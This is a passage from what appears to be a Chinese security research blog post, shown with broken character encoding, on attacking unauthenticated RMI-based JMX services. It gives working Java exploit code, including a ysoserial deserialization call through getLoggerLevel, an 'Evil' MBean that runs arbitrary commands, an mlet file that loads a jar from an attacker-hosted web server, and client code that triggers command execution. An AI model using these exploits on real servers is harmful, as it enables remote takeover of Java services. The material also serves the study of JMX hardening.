href="https://www.oracle.com/java/technologies/javase/8u91-relnotes.html">ä¿®å¤</a></p><h3 id="2-4-JMXå±‚MBeanæ–¹æ³•getLoggerLevel-x2F-gcClassHistogramåˆ©ç”¨æ–¹å¼"><a href="#2-4-JMXå±‚MBeanæ–¹æ³•getLoggerLevel-x2F-gcClassHistogramåˆ©ç”¨æ–¹å¼" class="headerlink" title="2.4 JMXå±‚MBeanæ–¹æ³•getLoggerLevel&#x2F;gcClassHistogramåˆ©ç”¨æ–¹å¼"></a>2.4 JMXå±‚MBeanæ–¹æ³•getLoggerLevel&#x2F;gcClassHistogramåˆ©ç”¨æ–¹å¼</h3><p>å½“JMXå®¢æˆ·ç«¯è°ƒç”¨createMBean&#x2F;getObjectInstance&#x2F;invokeç­‰æ–¹æ³•æ—¶ï¼ŒæœåŠ¡ç«¯å¤„ç†æ—¶ä¼šå…ˆç»è¿‡sun.rmi.server.UnicastServerRef#dispatchè¿›è¡Œåˆ†å‘ï¼Œå½“ä¸æ‰§è¡ŒRMIå†…ç½®çš„bind&#x2F;lookup&#x2F;dirtyæ–¹æ³•æ—¶ï¼Œä¼šè¿›å…¥â€è°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•â€çš„é€»è¾‘</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/18.png"></p><p>å®¢æˆ·ç«¯è°ƒç”¨createMBean&#x2F;getAttributeç­‰å†…ç½®æ–¹æ³•æ—¶ï¼ŒæœåŠ¡ç«¯åˆ°è¾¾javax.management.remote.rmi.RMIConnectionImpl#invokeä¸­ï¼š</p><p>1ã€è°ƒç”¨java.rmi.MarshalledObject#getè¿˜åŸå‚æ•°å€¼</p><p>2ã€è°ƒç”¨åˆ°javax.management.remote.rmi.RMIConnectionImpl#doOperationæ ¹æ®å®¢æˆ·ç«¯è°ƒç”¨å…·ä½“æ–¹æ³•è¿›è¡Œåˆ†å‘å¤„ç†ï¼ŒåŒ…æ‹¬createMBeanã€getAttributeã€getObjectInstanceã€getObjectInstanceç­‰æ–¹æ³•</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/19.png"></p><p>java.rmi.MarshalledObject#get</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/20.png"></p><p>javax.management.remote.rmi.RMIConnectionImpl#doOperation</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/21.png"></p><p>åœ¨ä½¿ç”¨java.rmi.MarshalledObject#getè¿˜åŸè°ƒç”¨æ–¹æ³•çš„å‚æ•°å€¼æ—¶ï¼Œä¼šç›´æ¥è°ƒç”¨readObjectè¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°MBeanä¸­å¸¦å‚æ•°çš„æ–¹æ³•ï¼Œå°†æˆ‘ä»¬çš„æ¶æ„æ•°æ®å¡«å……å³å¯ï¼Œå¯¹åº”expä¸ºysoserialä¸­çš„ysoserial.exploit.JMXInvokeMBeanï¼Œè¯¥expé€šè¿‡è°ƒç”¨å¯¹è±¡åç§°ä¸ºâ€java.util.logging:type&#x3D;Loggingâ€çš„MBeançš„getLoggerLevelæ–¹æ³•è§¦å‘</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String servicePort = <span class="hljs-string">&quot;2222&quot;</span>;<br>JMXServiceURL url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">servicePort</span> +  <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector jmxConnector = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(url);<br>MBeanServerConnection mbeanServerConnection = jmxConnector.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br>Object payloadObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utils</span>.</span></span>make<span class="hljs-constructor">PayloadObject(<span class="hljs-string">&quot;Groovy1&quot;</span>, <span class="hljs-string">&quot;mspaint.exe&quot;</span>)</span>;<br>ObjectName mbeanName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectName(<span class="hljs-string">&quot;java.util.logging:type=Logging&quot;</span>)</span>;<br>mbeanServerConnection.invoke(mbeanName, <span class="hljs-string">&quot;getLoggerLevel&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;payloadObject&#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">CanonicalName()</span>&#125;);<br>jmxConnector.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/22.png"></p><p>jconsoleæŸ¥çœ‹java.util.logging:type&#x3D;Loggingä¸ºé»˜è®¤çš„MBeanï¼Œå¦å¤–è¿˜æœ‰å¾ˆå¤šMBeançš„æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨ï¼šjava.lang:type&#x3D;Threading#getThreadCpuTimeã€java.lang:type&#x3D;Threading#getThreadInfoã€com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogramç­‰ç­‰</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/23.png"></p><p>com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogramåˆ©ç”¨</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/24.png"></p><h3 id="2-5-MLETåŠ¨æ€åŠ è½½Evil-MBeanåˆ©ç”¨æ–¹å¼"><a href="#2-5-MLETåŠ¨æ€åŠ è½½Evil-MBeanåˆ©ç”¨æ–¹å¼" class="headerlink" title="2.5 MLETåŠ¨æ€åŠ è½½Evil MBeanåˆ©ç”¨æ–¹å¼"></a>2.5 MLETåŠ¨æ€åŠ è½½Evil MBeanåˆ©ç”¨æ–¹å¼</h3><p>é™¤äº†åˆ©ç”¨æœ¬èº«å­˜åœ¨çš„MBeanï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªè¡Œæ·»åŠ MBeanè¿›è¡Œåˆ©ç”¨ï¼Œå¯ä»¥ä½¿ç”¨<code>javax.management.loading.MLet</code> MBean å¹¶è°ƒç”¨å…¶getMBeansFromURLæ“ä½œæŒ‡ç¤ºJMXæœåŠ¡ç«¯ä»è¿œç«¯åŠ è½½æ³¨å†Œæ„å»ºçš„æ¶æ„MBeanï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬åˆ›å»ºçš„çš„MBeanæ“ä½œè€Œä¸éœ€è¦æœåŠ¡ç«¯ClassPathå­˜åœ¨Gadgetã€‚è¿™ç§ä»å¤–éƒ¨åŠ è½½MBeançš„æ–¹å¼åœ¨å®˜æ–¹ä¹Ÿæœ‰è¯´æ˜ <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/25.png"></p><p>åˆ†æä¸‹getMBeansFromURLæ–¹æ³•æ˜¯å¦‚ä½•æ“ä½œçš„ï¼Œjavax.management.loading.MLet#getMBeansFromURL(java.lang.String)ä¸­åˆ†ä¸º2æ­¥ï¼š</p><p>1ã€åŠ è½½mletæ–‡ä»¶è§£ææ ‡ç­¾</p><p>2ã€å½“åˆ›å»ºMBeanæŒ‡å®šçš„classåœ¨æœ¬åœ°ClassPathä¸­æ‰¾ä¸åˆ°æ—¶ï¼Œåˆ™ä½¿ç”¨MLET classloaderå»å¤–éƒ¨åœ°å€ï¼ˆç¬¬ä¸€æ­¥å¾—åˆ°çš„codebase+archiveå±æ€§å€¼ï¼‰è¿›è¡ŒåŠ è½½</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/26.png"></p><p>javax.management.loading.MLetParser#parseè§£æ<code>&lt;mlet&gt;</code>æ ‡ç­¾çš„å†…å®¹å¹¶æ”¾å…¥attributes</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/27.png"></p><p>æ¥ç€è¿”å›åˆ°getMBeansFromURLæ–¹æ³•è°ƒç”¨com.sun.jmx.mbeanserver.JmxMBeanServer#createMBeanåˆ›å»ºMBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/28.png"></p><p>è°ƒç”¨åˆ°com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBeanåˆ›å»ºMBeanæ—¶ï¼Œä¼šæ£€æŸ¥æ˜¯å¦æœ‰instantiateã€registerMBeanæƒé™ã€‚å¦‚æœæœªå¼€å¯SecurityManagerï¼Œåˆ™ä¼šè·³è¿‡æ£€æŸ¥</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/29.png"></p><p>æœ€ç»ˆåœ¨ com.sun.jmx.mbeanserver.MBeanInstantiator#loadClassä¸­ä½¿ç”¨MLET classloaderå»åŠ è½½org.example.Evilç±»ï¼ˆcodesourceå°±æ˜¯mletæ–‡ä»¶ä¸­codebase+archiveå±æ€§å€¼ï¼‰ã€‚è¿™é‡Œä½¿ç”¨<code>Class.forName(className, false, loader);</code>åˆå§‹åŒ–çš„é€‰é¡¹ä¸ºfalseï¼Œä¸ä¼šæ‰§è¡Œé™æ€ä»£ç å—ä¸­çš„ä»£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€‰æ‹©invokeè°ƒç”¨MBeançš„æ¶æ„æ–¹æ³•è¿›è¡Œåˆ©ç”¨</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/30.png"></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/31.png"></p><p>é’ˆå¯¹å‰æ–‡åœ¨2222ç«¯å£å¼€å¯çš„JMXæœåŠ¡ï¼Œå¤ç°ä¸‹MLETè¿™ç§åˆ©ç”¨æ–¹æ³•ï¼š</p><p>1ã€åˆ›å»ºEvilç±»åŠEvilMBeanæ¥å£ï¼ˆæ¶æ„æ“ä½œä¸ºrunCommandï¼‰ï¼Œå¹¶å°†å…¶æ‰“åŒ…ä¸ºJmxEvilBean.jar</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//EvilMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);<br>&#125;<br><br><span class="hljs-comment">//Evil.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd)<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            Process proc = rt.exec(cmd);<br>            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));<br>            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));<br>            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">String</span> s;<br>            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            proc.waitFor();<br>            <span class="hljs-keyword">return</span> stdout_err_data;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2ã€åˆ›å»ºMLETæ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;mlet <span class="hljs-attribute">code</span>=<span class="hljs-string">&quot;org.example.Evil&quot;</span> <span class="hljs-attribute">archive</span>=<span class="hljs-string">&quot;JmxEvilBean.jar&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;MLetCompromise:name=evil,id=10&quot;</span> <span class="hljs-attribute">codebase</span>=<span class="hljs-string">&quot;http://192.168.232.1:3333&quot;</span>&gt;&lt;/mlet&gt;<br></code></pre></td></tr></table></figure><p>å°†JmxEvilBean.jarã€mletæ–‡ä»¶æ”¾åœ¨webæœåŠ¡ä¸‹ï¼špython -m SimpleHTTPServer 3333</p><p>3ã€EXPåˆ©ç”¨ï¼šè¿æ¥æœåŠ¡ã€åˆ›å»ºMLet MBeanã€invokeè°ƒç”¨getMBeansFromURLåŠ è½½å¤–éƒ¨Evil MBeanã€invokeè°ƒç”¨Evil MBeançš„runCommandæ“ä½œè¿”å›æ‰§è¡Œç»“æœ</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String port = <span class="hljs-string">&quot;2222&quot;</span>;<br>String command = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-comment">//1ã€è¿æ¥JMXæœåŠ¡</span><br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">port</span> + <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-comment">//2ã€åˆ›å»ºMBean,ç±»ä¸ºjavax.management.loading.MLetã€nameä¸ºtest.Mbean:type=MLet,id=1</span><br>ObjectInstance evil = m.create<span class="hljs-constructor">MBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-params">new</span> ObjectName(<span class="hljs-string">&quot;test.Mbean:type=MLet,id=1&quot;</span>)</span>);<br><span class="hljs-comment">//3ã€è°ƒç”¨MBeançš„getMBeansFromURLæ“ä½œï¼Œä»http://192.168.232.1:3333/mletåŠ è½½mletæ–‡ä»¶åˆ›å»ºæ–°çš„MBean</span><br>Object res = m.invoke(evil.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;http://192.168.232.1:3333/mlet&quot;</span>&#125;,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span> &#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125; );<br><br>HashSet res_set = ((HashSet)res);<br>Iterator itr = res_set.iterator<span class="hljs-literal">()</span>;<br>Object nextObject = itr.next<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//4ã€invokeè°ƒç”¨æ–°çš„MBeançš„runCommandæ“ä½œå¹¶è¿”å›ç»“æœ</span><br>ObjectInstance evil_bean = ((ObjectInstance)nextObject);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span>+evil_bean.get<span class="hljs-constructor">ClassName()</span>+<span class="hljs-string">&quot; object &quot;</span>+evil_bean.get<span class="hljs-constructor">ObjectName()</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span>+command);<br>Object result = m.invoke(evil_bean.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123; command &#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125;);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Result: &quot;</span>+result);<br></code></pre></td></tr></table></figure><p>expè¿è¡Œåï¼Œå¯ä»¥åœ¨jconsoleä¸­çœ‹åˆ°åˆ›å»ºçš„test.Mbean:type&#x3D;MLet,id&#x3D;1ã€MLetCompromise:name&#x3D;evil,id&#x3D;10 MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/32.png"></p><p>EXPä¹Ÿå›æ˜¾äº†ipconfigå‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/33.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå½“æœåŠ¡æœªé‡å¯çš„æƒ…å†µä¸‹ï¼Œåç»­åˆ©ç”¨ç›´æ¥invokeè°ƒç”¨runCommandå°±å¯ä»¥äº†ï¼Œä¸éœ€è¦å†æ¬¡åˆ›å»ºMBean</p><h2 id="3ã€å¯†ç éªŒè¯"><a href="#3ã€å¯†ç éªŒè¯" class="headerlink" title="3ã€å¯†ç éªŒè¯"></a>3ã€å¯†ç éªŒè¯</h2><p>ç¬¬äºŒç« èŠ‚åˆ†æçš„æ˜¯JMXæœåŠ¡æœªå¼€å¯æƒé™éªŒè¯åŠSSLéªŒè¯æ—¶çš„æ¼æ´åˆ©ç”¨æƒ…å†µï¼Œå¦å¤–åˆ†æä¸‹å½“å¼€å¯æƒé™éªŒè¯æ—¶æ¼æ´åˆ©ç”¨çš„æƒ…å†µæœ‰ä»€ä¹ˆå˜åŒ–ã€‚é»˜è®¤å¯åŠ¨JMXç®¡ç†æœåŠ¡æ—¶ï¼ˆä¸æŒ‡å®šcom.sun.management.jmxremote.authenticateé…ç½®ï¼‰ï¼Œè¿œç¨‹å®¢æˆ·ç«¯è¿æ¥æ—¶å°±éœ€è¦é€šè¿‡éªŒè¯ã€‚è€ŒéªŒè¯æ‰€éœ€çš„å¯†ç -æƒé™æ˜¯ä»¥æ˜æ–‡å­˜å‚¨åœ¨æœåŠ¡ç«¯&#x2F;jre&#x2F;lib&#x2F;management&#x2F;ç›®å½•çš„jmxremote.passwordã€jmxremote.accessæ–‡ä»¶ä¸­çš„ï¼Œä¸”éœ€è¦è®¾ç½®è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æƒé™ä¸ºï¼šé™¤æ–‡ä»¶æ‰€æœ‰è€…å…·æœ‰æ§åˆ¶æƒï¼Œå…¶å®ƒç”¨æˆ·æ— ä»»ä½•æƒé™ã€‚å¦åˆ™å¯åŠ¨æ—¶ä¼šæŠ¥é”™ï¼šsun.management.AgentConfigurationErrorã€‚å¦‚ä¸‹æ˜¯å¯åŠ¨å‘½ä»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æˆªå›¾åŠæ–‡ä»¶æƒé™å¦‚ä¸‹ï¼š</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/34.png"></p><p>ä½¿ç”¨å®¢æˆ·ç«¯jconsole ä»¥åªè¯»è´¦æˆ·guest password1è¿›è¡Œè¿æ¥</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/35.png"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨JAVAä»£ç è¿æ¥ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">HashMap env = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;<br>env.put(<span class="hljs-string">&quot;jmx.remote.credentials&quot;</span>,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;guest&quot;</span>,<span class="hljs-string">&quot;password1&quot;</span>&#125;);<br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u,env);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(m.get<span class="hljs-constructor">MBeanCount()</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/36.png"></p><p>æ–‡ä»¶æƒé™è®¾ç½®å‚è€ƒï¼š<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html</a></p><p>åˆ†æä¸‹å½“åŠ å…¥æƒé™éªŒè¯åï¼ŒJMXæœåŠ¡ç«¯çš„æ£€æµ‹é€»è¾‘æ˜¯æ€æ ·çš„ï¼Ÿå½“æˆ‘ä»¬è·å–äº†ä¸€ä¸ªä½æƒé™&#x2F;åªè¯»æƒé™è´¦æˆ·æ—¶å¯ä»¥åšå“ªäº›äº‹æƒ…ï¼Ÿæˆ‘ä»¬ä»è¿æ¥æœåŠ¡ç«¯åˆ°æ‰§è¡ŒMBeanæ“ä½œçš„æ•´ä½“æµç¨‹æ¥çœ‹ï¼Œåˆ†ä¸ºå‡ æ­¥ï¼š</p><p>1ã€å®¢æˆ·ç«¯ä½¿ç”¨javax.naming.InitialContext#lookupè·å–åˆ°åç§°ä¸ºâ€jmxrmiâ€çš„ Stubä»£ç†å¯¹è±¡ï¼Œå³ä¸‹å›¾çš„å˜é‡serverï¼›</p><p>2ã€å®¢æˆ·ç«¯è°ƒç”¨javax.management.remote.rmi.RMIServer#newClientå»è·å–RMIConnectionImpl Stubä»£ç†å¯¹è±¡ï¼ŒæœåŠ¡ç«¯javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#newClientæ‰§è¡ŒJAAS-based authenticatorè¿›è¡Œæƒé™æ ¡éªŒï¼šæ ¹æ®æœåŠ¡çš„å¯åŠ¨å‚æ•°åŠjmxremote.passwordã€jmxremote.accessé…ç½®æ–‡ä»¶å»åŒ¹é…ï¼Œå½“æ ¡éªŒé€šè¿‡åè¿”å›ä»£ç†å¯¹è±¡ï¼Œå³ä¸‹å›¾çš„å˜é‡cï¼›</p><p>3ã€å®¢æˆ·ç«¯invokeè°ƒç”¨RMIConnectionImpl Stubä»£ç†å¯¹è±¡çš„æ–¹æ³•å»æ“ä½œMBean&#x2F;è·å–MBeanä¿¡æ¯ã€‚åœ¨å¦ä¸€è¾¹çš„JMXæœåŠ¡ç«¯ä¼šæ ¹æ®objidç¡®è®¤å¤„ç†å®¢æˆ·ç«¯æ­¤æ¬¡è¯·æ±‚é€»è¾‘çš„Targetï¼Œ[0:0:0,0]ã€[0:0:0,2] è¿™æ˜¯åœ¨ä¹‹å‰æ”»å‡»RMIä¸­åˆ†æè¿‡çš„RegistryImpl_Stubã€DGCImpl_Stubï¼Œè€Œæ¶‰åŠJMXæ˜¯å¦å¤–å‡ ä¸ªTargetï¼Œåœ¨æœ¬å®ä¾‹ä¸­çš„objIDä¸ºï¼š[613d5ccd:18470553d20:-7fff, -4868886411976892153]ã€[613d5ccd:18470553d20:-7ffa, -8893277592355947578]ï¼Œå¦‚ä¸‹å›¾æ˜¯å®¢æˆ·ç«¯æ‹¿åˆ°ä¸¤æ¬¡è¯·æ±‚çš„è¿”å›å¯¹è±¡è°ƒè¯•æƒ…å†µ</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/37.png"></p><p>å½“è°ƒç”¨MBeançš„å…·ä½“æ“ä½œæ–¹æ³•æ—¶ï¼Œå¦‚javax.management.remote.rmi.RMIConnection#getConnectionIdï¼Œåœ¨æœåŠ¡ç«¯ä¼šè°ƒç”¨åˆ°javax.management.remote.rmi.RMIConnectionImpl#getConnectionIdè¿›è¡Œå¤„ç†</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/38.png"></p><p>æ·»åŠ é‰´æƒå‰åï¼Œç”±äºæœåŠ¡ç«¯åœ¨å¯åŠ¨æ—¶æ·»åŠ çš„Targetä¸åŒï¼Œåœ¨æ·»åŠ é‰´æƒå mbeanServerçš„å€¼ä»DefaultMBeanServerInterceptorå˜ä¸ºMBeanServerAccessControllerï¼Œå¯¹äºæ¯ä¸ªæ“ä½œå…·ä½“éœ€è¦çš„æƒé™éƒ½åœ¨MBeanServerAccessControllerä¸­è¿›è¡Œåˆ¤æ–­ï¼ˆobjidä¸ä¸Šé¢æ¼”ç¤ºçš„ä¸åŒï¼Œå› ä¸ºæ˜¯åé¢çš„è¡¥å›¾ï¼‰</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/39.png"></p><p>æ— é‰´æƒæ—¶ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span 